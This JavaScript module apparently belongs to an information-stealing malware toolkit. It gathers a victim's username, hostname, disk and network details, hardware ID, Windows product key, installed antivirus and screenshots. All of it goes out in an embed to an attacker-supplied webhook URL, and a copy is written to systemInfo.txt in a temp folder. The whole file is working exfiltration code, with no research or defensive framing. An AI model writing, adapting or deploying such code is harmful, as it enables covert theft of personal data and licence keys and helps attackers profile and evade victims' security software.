const os = require('os');

const requests = require('../../utils/requests/requests.js');
const fileutil = require('../../utils/fileutil/fileutil.js');

const Software = require('../../utils/software/software.js');

module.exports = async (webhookUrl) => {
  const { WINDOWS_VERSION, ANTIVIRUS_INFO, WINDOWS_KEY, SCREENSHOTS, DISKS_INFO, CPU_COUNT, NETWORK, UUID, DISK, CPU, GPU, RAM, IP, OS } = await Software();

  const screen = SCREENSHOTS ? SCREENSHOTS : null;

  try {
    await requests.Webhook(
      webhookUrl,
      {
        embeds: [
          {
            title: 'System Information',
            fields: [
              {
                name: 'User Information',
                value: `\`\`\`Username: ${os.userInfo().username}\nHostname: ${os.hostname()}\`\`\``,
              },
              {
                name: 'Disk Information',
                value: `\`\`\`${DISKS_INFO}\`\`\``,
              },
              {
                name: 'System Specs',
                value: `\`\`\`OS: ${OS}\nCPU: ${CPU}\nGPU: ${GPU}\nRAM: ${RAM}\nHWID: ${UUID}\nProduct Key: ${WINDOWS_KEY}\`\`\``,
              },
              {
                name: 'Network Details',
                value: `\`\`\`${Object.entries(NETWORK)
                  .map(([name, value]) => `${name}: ${value}`)
                  .join('\n')}\`\`\``,
              },
            ],
          },
        ],
      },
      [screen]
    );

    const systemInfo = [
      `Username: ${os.userInfo().username}`,
      `Hostname: ${os.hostname()}\n`,
      `Local IP: ${IP}\n`,
      `Disks: ${DISK}\n${DISKS_INFO}\n`,
      `COUNT: ${CPU_COUNT}`,
      `OS: ${OS}`,
      `CPU: ${CPU}`,
      `GPU: ${GPU}`,
      `RAM: ${RAM}`,
      `HWID: ${UUID}\n`,
      `Windows Version: ${WINDOWS_VERSION}`,
      `Product Key: ${WINDOWS_KEY}\n`,
      `Network:\n${Object.entries(NETWORK)
        .map(([name, value]) => `${name}: ${value}`)
        .join('\n')}\n`,
      `AntiVirus:\n${Object.entries(ANTIVIRUS_INFO)
        .map(([name, value]) => `${name}: ${value}`)
        .join('\n')}`,
    ];

    const WishTempDir = fileutil.WishTempDir('system');
    await fileutil.WriteDataToFile(WishTempDir, 'systemInfo.txt', systemInfo);
  } catch (error) {
    console.error(error);
  }
};
